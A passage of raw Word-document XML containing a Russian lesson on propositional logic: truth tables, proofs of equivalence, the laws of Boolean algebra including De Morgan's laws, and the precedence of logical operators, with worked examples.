      </w:pPr>
      <w:r>
        <w:t>n переменных → 2ⁿ строк</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Построение таблиц истинности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм построения таблицы истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Определить количество переменных (n) и количество строк (2ⁿ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Создать столбцы для всех переменных и для результата</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Заполнить входные переменные всеми возможными комбинациями 0 и 1  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>_Удобный способ:_ для крайней правой переменной чередовать 0 и 1, для следующей — группы по 2 (00, 11), для следующей — группы по 4, и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислить результат для каждой строки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Простое выражение A ∧ B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ∧ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Сложное выражение (A ∨ B) ∧ ¬C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сначала определим промежуточные результаты для удобства:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | C | A ∨ B | ¬C | (A ∨ B) ∧ ¬C |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|---|-------|----|--------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0 | 0     | 1  | 0            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1 | 0     | 0  | 0            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0 | 1     | 1  | 1            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1 | 1     | 0  | 0            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0 | 1     | 1  | 1            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 1 | 1     | 0  | 0            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 0 | 1     | 1  | 1            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1 | 1     | 0  | 0            |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Выражение A → (B ∨ C)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | C | B ∨ C | A → (B ∨ C) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|---|-------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0 | 0     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0 | 0     | 0           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 1 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 0 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1 | 1     | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение выражений через таблицы истинности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Два логических выражения </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>эквивалентны</w:t>
      </w:r>
      <w:r>
        <w:t>, если их таблицы истинности полностью совпадают (одинаковые результаты для всех комбинаций входных данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Доказать, что A → B ≡ ¬A ∨ B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Построим таблицу для обоих выражений:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A → B | ¬A | ¬A ∨ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|---|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1     | 1 | 1      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1     | 1 | 1      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     | 0 | 0      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     | 0 | 1      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Столбцы "A → B" и "¬A ∨ B" полностью совпадают → выражения эквивалентны!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Законы алгебры логики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгебра высказываний имеет систему законов, аналогичных законам обычной алгебры, но с важными отличиями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные тождества</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Законы идемпотентности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ A = A</w:t>
        <w:br/>
        <w:t>A ∨ A = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Повторение одной и той же переменной не изменяет результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Законы с константами (нейтральные и поглощающие элементы):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ 1 = A    (1 — нейтральный элемент для И)</w:t>
        <w:br/>
        <w:t>A ∧ 0 = 0    (0 — поглощающий элемент для И)</w:t>
        <w:br/>
        <w:t>A ∨ 0 = A    (0 — нейтральный элемент для ИЛИ)</w:t>
        <w:br/>
        <w:t>A ∨ 1 = 1    (1 — поглощающий элемент для ИЛИ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Законы с отрицанием:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ ¬A = 0    (закон противоречия)</w:t>
        <w:br/>
        <w:t>A ∨ ¬A = 1    (закон исключённого третьего)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Высказывание и его отрицание не могут быть одновременно истинными, но одно из них обязательно истинно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Закон двойного отрицания:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>¬(¬A) = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Отрицание отрицания возвращает к исходному значению.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Коммутативность, ассоциативность, дистрибутивность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Законы коммутативности (перестановочности):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ B = B ∧ A</w:t>
        <w:br/>
        <w:t>A ∨ B = B ∨ A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Порядок операндов не влияет на результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6. Законы ассоциативности (сочетательности):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(A ∧ B) ∧ C = A ∧ (B ∧ C)</w:t>
        <w:br/>
        <w:t>(A ∨ B) ∨ C = A ∨ (B ∨ C)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При выполнении нескольких одинаковых операций порядок группировки не важен. Можно опускать скобки: A ∧ B ∧ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7. Законы дистрибутивности (распределительности):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ (B ∨ C) = (A ∧ B) ∨ (A ∧ C)    (И распределяется относительно ИЛИ)</w:t>
        <w:br/>
        <w:t>A ∨ (B ∧ C) = (A ∨ B) ∧ (A ∨ C)    (ИЛИ распределяется относительно И)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важное отличие от обычной алгебры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> во второй строке ИЛИ распределяется относительно И. В обычной арифметике такого нет: a + (b × c) ≠ (a + b) × (a + c).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Законы поглощения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8. Законы поглощения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ (A ∨ B) = A</w:t>
        <w:br/>
        <w:t>A ∨ (A ∧ B) = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доказательство первого закона:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ (A ∨ B) = (A ∧ A) ∨ (A ∧ B)    [дистрибутивность]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            = A ∨ (A ∧ B)          [идемпотентность]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            = A ∧ (1 ∨ B)          [вынесение A]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            = A ∧ 1                [1 ∨ B = 1]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            = A                    [нейтральный элемент]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>9. Обобщённые законы поглощения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ∧ (¬A ∨ B) = A ∧ B</w:t>
        <w:br/>
        <w:t>A ∨ (¬A ∧ B) = A ∨ B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Законы де Моргана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10. Законы де Моргана</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (очень важные для упрощения логических выражений):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>¬(A ∧ B) = ¬A ∨ ¬B</w:t>
        <w:br/>
        <w:t>¬(A ∨ B) = ¬A ∧ ¬B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесная формулировка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отрицание конъюнкции равно дизъюнкции отрицаний</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отрицание дизъюнкции равно конъюнкции отрицаний</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> при распределении отрицания на выражение в скобках:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Меняем операцию на противоположную (И ↔ ИЛИ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отрицаем каждый операнд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>¬(A ∧ B ∧ C) = ¬A ∨ ¬B ∨ ¬C</w:t>
        <w:br/>
        <w:t>¬(A ∨ B ∨ C) = ¬A ∧ ¬B ∧ ¬C</w:t>
        <w:br/>
        <w:t>¬((A ∧ B) ∨ C) = (¬A ∨ ¬B) ∧ ¬C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>В программировании законы де Моргана помогают упростить условия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Было:</w:t>
        <w:br/>
        <w:t>if not (is_weekend and is_sunny):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stay_home()</w:t>
        <w:br/>
        <w:br/>
        <w:t># Стало (по закону де Моргана):</w:t>
        <w:br/>
        <w:t>if (not is_weekend) or (not is_sunny):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stay_home()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Доказательство через таблицу истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ∧ B | ¬(A ∧ B) | ¬A | ¬B | ¬A ∨ ¬B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|----------|----|----|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     | 1        | 1  | 1  | 1       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     | 1        | 1  | 0  | 1       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     | 1        | 0  | 1  | 1       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     | 0        | 0  | 0  | 0       |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Столбцы "¬(A ∧ B)" и "¬A ∨ ¬B" совпадают → закон доказан!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Другие важные законы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>11. Законы склеивания:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(A ∧ B) ∨ (A ∧ ¬B) = A</w:t>
        <w:br/>
        <w:t>(A ∨ B) ∧ (A ∨ ¬B) = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12. Закон инволюции для XOR:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ⊕ B ⊕ B = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>13. Закон противоположности для импликации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A → B = ¬B → ¬A    (контрапозиция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если "из A следует B", то "из не-B следует не-A".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Если идёт дождь, то асфальт мокрый" = "Если асфальт сухой, то дождя нет"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Порядок выполнения логических операций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Как и в обычной арифметике, в алгебре высказываний существует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приоритет операций</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (очерёдность выполнения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Таблица приоритетов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порядок выполнения (от наивысшего к низшему приоритету):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Приоритет | Операция      | Обозначение | Примечание              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|---------------|-------------|-------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1         | Отрицание     | ¬           | Выполняется первым      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2         | Конъюнкция    | ∧           | Логическое умножение    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3         | Дизъюнкция    | ∨           | Логическое сложение     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4         | Импликация    | →           | Следование              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 5         | Эквивалентность| ↔          | Выполняется последним   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скобки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> имеют наивысший приоритет — выражения в скобках вычисляются в первую очередь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия с арифметикой:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Арифметика          | Алгебра логики    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Скобки ()           | Скобки ()         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Минус (унарный) -   | Отрицание ¬       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Умножение ×         | Конъюнкция ∧      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Сложение +          | Дизъюнкция ∨      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры вычисления с учётом приоритета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выражение: A ∨ B ∧ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Без скобок это эквивалентно: A ∨ (B ∧ C)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Сначала выполняется конъюнкция (∧), затем дизъюнкция (∨)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выражение: ¬A ∧ B ∨ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Порядок вычисления:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>¬A (отрицание — самый высокий приоритет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>(¬A) ∧ B (конъюнкция)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>((¬A) ∧ B) ∨ C (дизъюнкция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выражение: A → B ∨ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Порядок вычисления:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>B ∨ C (дизъюнкция выполняется раньше импликации)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A → (B ∨ C) (импликация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выражение: A ∧ B → C ∧ D</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Порядок вычисления:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A ∧ B (конъюнкция слева)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>C ∧ D (конъюнкция справа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>(A ∧ B) → (C ∧ D) (импликация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
